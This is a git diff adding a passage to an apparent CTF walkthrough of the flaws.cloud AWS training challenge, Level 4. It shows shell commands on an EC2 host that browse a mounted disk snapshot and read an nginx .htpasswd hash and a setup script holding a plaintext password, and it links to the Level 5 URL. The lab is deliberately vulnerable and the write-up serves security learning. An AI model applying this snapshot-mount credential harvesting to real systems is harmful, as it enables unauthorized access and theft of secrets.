@@ -507,6 +507,32 @@ ubuntu@ip-172-31-27-89:~$ mount
 
 ![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/fe2f381e-691e-482b-8f28-4a1b803f6aa5)
 
+```
+ubuntu@ip-172-31-27-89:~$ ls /mnt/level4/
+bin   etc         initrd.img.old  lost+found  opt   run   srv  usr      vmlinuz.old
+boot  home        lib             media       proc  sbin  sys  var
+dev   initrd.img  lib64           mnt         root  snap  tmp  vmlinuz
+ubuntu@ip-172-31-27-89:~$ cat /mnt/level4/etc/nginx/.htpasswd
+flaws:$apr1$4ed/7TEL$cJnixIRA6P4H8JDvKVMku0
+ubuntu@ip-172-31-27-89:~$ ls /mnt/level4/home/ubuntu/
+meta-data  setupNginx.sh
+ubuntu@ip-172-31-27-89:~$ cat /mnt/level4/home/ubuntu/setupNginx.sh 
+htpasswd -b /etc/nginx/.htpasswd flaws nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M
+ubuntu@ip-172-31-27-89:~$ 
+```
+
+![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/36d33428-f805-4018-a1bf-2dc59ac10599)
+
+Visit: http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
+
+![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/d8029822-f48f-4781-83cf-0eb189fe7437)
+
+![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/2e2e49ba-2c57-4185-8e73-0545d15e4661)
+
+
+### Level 5:
+Visit: http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/
+
 
 
 
